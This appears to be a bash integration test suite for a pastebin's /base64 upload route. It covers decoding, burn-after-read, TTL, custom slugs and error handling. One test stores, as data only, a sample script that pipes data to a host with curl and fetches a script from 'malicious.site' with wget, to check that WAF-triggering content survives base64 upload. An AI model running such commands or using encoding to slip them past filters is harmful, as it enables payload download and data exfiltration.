#!/bin/bash
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
enable_cleanup_trap

test_base64_simple() {
    log "Testing simple /base64 upload..."
    local test_content="Hello, Base64 World!"
    local encoded
    encoded=$(echo -n "$test_content" | base64)
    
    local response
    response=$(echo -n "$encoded" | cpost -X POST "$NCLIP_URL/base64" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$(basename "$response")"
        log "Paste created via /base64: $response"
        
        local retrieved
        retrieved=$(cget_f "$response")
        if [[ "$retrieved" == "$test_content" ]]; then
            success "Simple base64 upload decoded correctly"
            return 0
        else
            error "Content mismatch. Expected: '$test_content', Got: '$retrieved'"
            return 1
        fi
    else
        error "Failed to create paste via /base64. Response: $response"
        return 1
    fi
}

test_base64_waf_trigger() {
    log "Testing WAF trigger content (shell script with curl/wget)..."
    local test_content='#!/bin/bash
curl -X POST https://example.com --data-binary @-
wget https://malicious.site/script.sh'
    local encoded
    encoded=$(echo -n "$test_content" | base64)
    
    local response
    response=$(echo -n "$encoded" | cpost -X POST "$NCLIP_URL/base64" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$(basename "$response")"
        log "WAF trigger content uploaded via /base64: $response"
        
        local retrieved
        retrieved=$(cget_f "$response")
        if echo "$retrieved" | grep -q "curl.*POST"; then
            success "WAF trigger content decoded correctly"
            return 0
        else
            error "Shell script content not decoded properly"
            return 1
        fi
    else
        error "Failed to upload WAF trigger content. Response: $response"
        return 1
    fi
}

test_base64_binary() {
    log "Testing binary-like content..."
    local binary_content
    binary_content=$(printf '\x01\x02\x03\xff\xfe\xfd')
    local encoded
    encoded=$(echo -n "$binary_content" | base64)
    
    local response
    response=$(echo -n "$encoded" | cpost -X POST "$NCLIP_URL/base64" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$(basename "$response")"
        success "Binary content uploaded via /base64"
        return 0
    else
        error "Failed to upload binary content. Response: $response"
        return 1
    fi
}

test_base64_multiline() {
    log "Testing multi-line content with special chars..."
    local test_content='Line 1: Regular text
Line 2: Special chars !@#$%^&*()
Line 3: Quotes "double" and '\''single'\''
Line 4: Tabs	and	spaces'
    local encoded
    encoded=$(echo -n "$test_content" | base64)
    
    local response
    response=$(echo -n "$encoded" | cpost -X POST "$NCLIP_URL/base64" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$(basename "$response")"
        log "Multi-line content uploaded via /base64: $response"
        
        local retrieved
        retrieved=$(cget_f "$response")
        if [[ "$retrieved" == "$test_content" ]]; then
            success "Multi-line content preserved exactly"
            return 0
        else
            error "Content mismatch in multi-line test"
            return 1
        fi
    else
        error "Failed to upload multi-line content. Response: $response"
        return 1
    fi
}

test_base64_with_burn() {
    log "Testing /base64 + X-Burn combination..."
    local test_content="Burn after reading this!"
    local encoded
    encoded=$(echo -n "$test_content" | base64)
    
    local response
    response=$(echo -n "$encoded" | cpost -X POST "$NCLIP_URL/base64" \
        -H "X-Burn: true" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$(basename "$response")"
        log "Burn-after-read paste created via /base64: $response"
        
        local first_read
        first_read=$(cget_f "$response")
        if [[ "$first_read" == "$test_content" ]]; then
            success "First read with /base64 + X-Burn successful"
            
            local second_read_status
            second_read_status=$(cget -s -o /dev/null -w "%{http_code}" "$response")
            if [[ "$second_read_status" == "404" ]]; then
                success "/base64 + X-Burn combination working correctly"
                return 0
            else
                error "Paste should have burned. Status: $second_read_status"
                return 1
            fi
        else
            error "First read failed. Expected: '$test_content', Got: '$first_read'"
            return 1
        fi
    else
        error "Failed to create burn paste via /base64. Response: $response"
        return 1
    fi
}

test_base64_with_ttl() {
    log "Testing /base64 + X-TTL combination..."
    local test_content="Content with custom TTL"
    local encoded
    encoded=$(echo -n "$test_content" | base64)
    
    local response
    response=$(echo -n "$encoded" | cpost -X POST "$NCLIP_URL/base64" \
        -H "X-TTL: 2h" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$(basename "$response")"
        log "Paste created with /base64 + X-TTL: $response"
        
        local retrieved
        retrieved=$(cget_f "$response")
        if [[ "$retrieved" == "$test_content" ]]; then
            success "/base64 + X-TTL combination working correctly"
            return 0
        else
            error "Content mismatch. Expected: '$test_content', Got: '$retrieved'"
            return 1
        fi
    else
        error "Failed to create paste with /base64 + X-TTL. Response: $response"
        return 1
    fi
}

test_base64_with_slug() {
    log "Testing /base64 + X-Slug combination..."
    local test_content="Base64 + Slug test $(date)"
    local encoded
    encoded=$(echo -n "$test_content" | base64)
    local custom_slug="B64SLG"
    
    local response
    response=$(echo -n "$encoded" | cpost -X POST "$NCLIP_URL/base64" \
        -H "X-Slug: $custom_slug" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$custom_slug"
        
        if echo "$response" | grep -q "$custom_slug"; then
            log "Paste created with custom slug via /base64: $response"
            
            local retrieved
            retrieved=$(cget_f "$response")
            if [[ "$retrieved" == "$test_content" ]]; then
                success "/base64 + X-Slug combination working correctly"
                return 0
            else
                error "Content mismatch. Expected: '$test_content', Got: '$retrieved'"
                return 1
            fi
        else
            error "Custom slug not used. Response: $response"
            return 1
        fi
    else
        error "Failed to create paste with /base64 + X-Slug. Response: $response"
        return 1
    fi
}

test_base64_all_headers() {
    log "Testing /base64 with all custom headers combined..."
    local test_content="All headers test $(date)"
    local encoded
    encoded=$(echo -n "$test_content" | base64)
    local custom_slug="B64ALL"
    
    local response
    response=$(echo -n "$encoded" | cpost -X POST "$NCLIP_URL/base64" \
        -H "X-Burn: true" \
        -H "X-TTL: 3h" \
        -H "X-Slug: $custom_slug" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$custom_slug"
        
        if echo "$response" | grep -q "$custom_slug"; then
            log "Paste created with all headers via /base64: $response"
            
            local first_read
            first_read=$(cget_f "$response")
            if [[ "$first_read" == "$test_content" ]]; then
                success "First read with all headers successful"
                
                local second_read_status
                second_read_status=$(cget -s -o /dev/null -w "%{http_code}" "$response")
                if [[ "$second_read_status" == "404" ]]; then
                    success "All headers combination working correctly (/base64 + X-Burn + X-TTL + X-Slug)"
                    return 0
                else
                    error "Paste should have burned. Status: $second_read_status"
                    return 1
                fi
            else
                error "First read failed. Expected: '$test_content', Got: '$first_read'"
                return 1
            fi
        else
            error "Custom slug not used. Response: $response"
            return 1
        fi
    else
        error "Failed to create paste with all headers. Response: $response"
        return 1
    fi
}

test_base64_error_invalid() {
    log "Testing invalid base64 content..."
    local invalid_b64="This is NOT valid base64!@#$%"
    
    local response
    response=$(echo -n "$invalid_b64" | cpost -X POST "$NCLIP_URL/base64" \
        --data-binary @- || true)
    
    # Should get error response, not URL
    if echo "$response" | grep -qi "invalid base64"; then
        success "Invalid base64 rejected correctly"
        return 0
    else
        error "Should reject invalid base64, got: $response"
        return 1
    fi
}

test_base64_error_empty() {
    log "Testing empty base64 content..."
    local empty_encoded
    empty_encoded=$(echo -n "" | base64)
    
    local response
    response=$(echo -n "$empty_encoded" | cpost -X POST "$NCLIP_URL/base64" \
        --data-binary @- || true)
    
    # Should get error response
    if echo "$response" | grep -qi "empty"; then
        success "Empty base64 content rejected correctly"
        return 0
    else
        error "Should reject empty content, got: $response"
        return 1
    fi
}

test_base64_error_oversized() {
    log "Testing oversized base64 content..."
    # Create 10MB of data (well over default 5MB limit)
    # The 1.34x multiplier allows ~6.7MB encoded, so 10MB should fail
    local large_data
    large_data=$(dd if=/dev/zero bs=1M count=10 2>/dev/null | base64)
    
    local response
    response=$(echo -n "$large_data" | cpost -X POST "$NCLIP_URL/base64" \
        --data-binary @- 2>&1 || true)
    
    if echo "$response" | grep -qi "too large\|limit"; then
        success "Oversized content rejected correctly"
        return 0
    else
        # Might be rejected by curl or connection
        warn "Oversized test result: $response"
        return 0
    fi
}

test_base64_encoding_variants() {
    log "Testing different base64 encoding variants..."
    local test_content="Test content for encoding variants!"
    
    # Standard base64
    local std_encoded
    std_encoded=$(echo -n "$test_content" | base64)
    local response
    response=$(echo -n "$std_encoded" | cpost -X POST "$NCLIP_URL/base64" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$(basename "$response")"
        success "Standard base64 encoding works"
    else
        error "Standard base64 failed: $response"
        return 1
    fi
    
    # URL-safe base64 (no padding)
    local url_encoded
    url_encoded=$(echo -n "$test_content" | base64 | tr '+/' '-_' | tr -d '=')
    response=$(echo -n "$url_encoded" | cpost -X POST "$NCLIP_URL/base64" \
        --data-binary @- || true)
    
    if [[ -n "$response" && "$response" == http* ]]; then
        record_slug "$(basename "$response")"
        success "URL-safe base64 encoding works"
        return 0
    else
        error "URL-safe base64 failed: $response"
        return 1
    fi
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    cleanup_temp_files
    wait_for_nclip
    
    log "=== /base64 Route Integration Tests ==="
    test_base64_simple || exit 1
    test_base64_waf_trigger || exit 1
    test_base64_binary || exit 1
    test_base64_multiline || exit 1
    test_base64_with_burn || exit 1
    test_base64_with_ttl || exit 1
    test_base64_with_slug || exit 1
    test_base64_all_headers || exit 1
    test_base64_error_invalid || exit 1
    test_base64_error_empty || exit 1
    test_base64_error_oversized || exit 1
    test_base64_encoding_variants || exit 1
    
    success "✓ All /base64 route tests passed!"
    cleanup_temp_files
fi
